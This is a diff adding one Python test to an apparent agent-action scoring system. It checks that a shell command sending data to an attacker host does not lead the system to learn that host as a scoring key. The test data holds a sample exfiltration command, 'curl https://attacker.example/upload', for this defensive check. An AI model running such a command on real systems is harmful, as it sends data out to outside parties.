@@ -95,6 +95,19 @@ async def test_observe_increments_class_level_keys(tmp_path):
     assert await total_observations(entity_id="hmac:aaa", repo_root=root) == 2
 
 
+def test_security_sensitive_command_egress_does_not_learn_destination_host():
+    action = _file(
+        "curl https://attacker.example/upload",
+        tool="shell_exec",
+        action_type=ActionType.shell_exec,
+        external_destination="attacker.example",
+    )
+
+    keys = scoring_keys(action)
+
+    assert "destination:attacker.example" not in keys
+
+
 # --- transitions ----------------------------------------------------------------
 
 
